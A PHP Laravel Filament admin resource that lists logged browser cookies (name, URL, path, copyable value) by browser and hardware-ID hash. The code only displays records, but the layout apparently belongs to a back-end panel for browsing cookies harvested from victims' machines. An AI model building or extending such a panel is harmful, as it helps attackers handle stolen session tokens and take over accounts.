<?php

namespace App\Filament\Resources;

use App\Filament\Resources\CookieResource\Pages;
use App\Filament\Resources\CookieResource\RelationManagers;
use App\Models\Cookie;
use Filament\Forms;
use Filament\Resources\Form;
use Filament\Resources\Resource;
use Filament\Resources\Table;
use Filament\Tables;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\SoftDeletingScope;

class CookieResource extends Resource
{
    protected static ?string $model = Cookie::class;
    protected static ?string $navigationGroup = 'Logs';
    protected static ?string $navigationIcon = 'heroicon-o-cube-transparent';

    public static function form(Form $form): Form
    {
        return $form
            ->schema([

            ]);
    }

    public static function table(Table $table): Table
    {
        return $table
            ->columns([
                Tables\Columns\TextColumn::make('browser.hwid.hash'),
                Tables\Columns\TextColumn::make('browser.name'),
                Tables\Columns\TextColumn::make('url'),
                Tables\Columns\TextColumn::make('path'),
                Tables\Columns\TextColumn::make('value')->limit(16)->copyable(),
                Tables\Columns\TextColumn::make('name'),
            ])
            ->filters([
                //
            ])
            ->actions([
                //Tables\Actions\EditAction::make(),
            ])
            ->bulkActions([
                Tables\Actions\DeleteBulkAction::make(),
            ]);
    }

    public static function getRelations(): array
    {
        return [
            //
        ];
    }

    public static function getPages(): array
    {
        return [
            'index' => Pages\ListCookies::route('/'),
            'create' => Pages\CreateCookie::route('/create'),
            'edit' => Pages\EditCookie::route('/{record}/edit'),
        ];
    }
}
